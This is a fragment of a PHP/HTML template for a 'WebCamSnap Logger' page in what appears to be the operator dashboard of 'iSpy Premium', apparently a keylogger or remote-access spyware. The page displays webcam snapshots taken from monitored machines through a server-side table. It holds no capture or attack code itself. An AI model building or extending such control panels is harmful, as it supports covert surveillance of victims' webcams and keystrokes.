...
<head>        
        <!-- META SECTION -->
        <title>iSpy Premium - WebCamSnap Logger</title>            
        ...
        $(document).ready(function() {
            $('#tblKeystrokes').DataTable( {
                  "processing": true,
                  "serverSide": true,
                  "ajax": "<?php echo base_url();?>getwebcam"
             });
        });
        </script>       
        <!-- EOF CSS INCLUDE -->            
        ...
        <div class="page-container">
            ...
            <div class="page-content">
                ...
                <ul class="breadcrumb">
                    ...
                    <li class="active">WebCamSnap Logger</li>
                </ul>
                <!-- END BREADCRUMB -->                
                
                <div class="page-title">                    
                    <h2><span class="fa fa-keyboard-o"></span> WebCamSnap Logger</h2>
                </div>                   
                    ...
                    <div class="row">
                        <div class="col-md-4">
                                <div class="list-group border-bottom">
                                    ...
                                    <a href="webcamsnap" class="list-group-item active">WebCamSnap Logger <span class="badge badge-primary"><?php echo $this->security->xss_clean($webcamsnap_log_amount); ?></span></a>
                        ...
                        <div class="col-md-8">
                                <?php if (!$logs) { ?>
                                    <div class="alert alert-danger" role="alert">
                                        <center>You don't currently have any WebcamSnaps. A table will be generated when you receive your first log.</center>
                                    </div>
                                <?php } else { ?>
